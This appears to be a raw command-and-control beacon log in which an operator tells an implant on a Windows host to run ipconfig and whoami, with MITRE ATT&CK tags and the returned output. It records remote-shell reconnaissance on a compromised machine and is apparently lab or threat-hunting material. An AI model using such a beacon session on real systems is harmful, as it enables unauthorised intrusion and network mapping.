10/21 09:56:37 UTC [metadata] 172.16.56.139 <- 169.254.198.49; computer: READER-L-PC; user: reader-l; process: artifact.exe; pid: 2856; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
10/21 09:57:34 UTC [input] <reader-l> sleep 0
10/21 09:57:34 UTC [task] <T1029> Tasked beacon to become interactive
10/21 09:58:32 UTC [checkin] host called home, sent: 16 bytes
10/21 09:58:38 UTC [input] <reader-l> shell ipconfig
10/21 09:58:38 UTC [task] <T1059> Tasked beacon to run: ipconfig
10/21 09:58:39 UTC [checkin] host called home, sent: 39 bytes
10/21 09:58:39 UTC [output]
received output:

Windows IP 配置


以太网适配器 本地连接 3:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::5998:57c9:217b:c631%15
   自动配置 IPv4 地址  . . . . . . . : 169.254.198.49
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::ecb1:8b80:7c45:f6d6%13
   IPv4 地址 . . . . . . . . . . . . : 172.16.55.143
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::4960:f6db:d44:6bd5%11
   IPv4 地址 . . . . . . . . . . . . : 172.16.56.139
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 

隧道适配器 isatap.{E4D0D344-E4EA-4124-8977-0C59010D611F}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{65AE043E-6A43-4C5F-BD44-769C1A39DF28}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{947D5CAC-67C3-4EAE-9855-AF71CFC027D7}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


10/21 09:58:45 UTC [input] <reader-l> shell whoami
10/21 09:58:45 UTC [task] <T1059> Tasked beacon to run: whoami
10/21 09:58:45 UTC [checkin] host called home, sent: 37 bytes
10/21 09:58:45 UTC [output]
received output:
reader-l-pc\reader-l


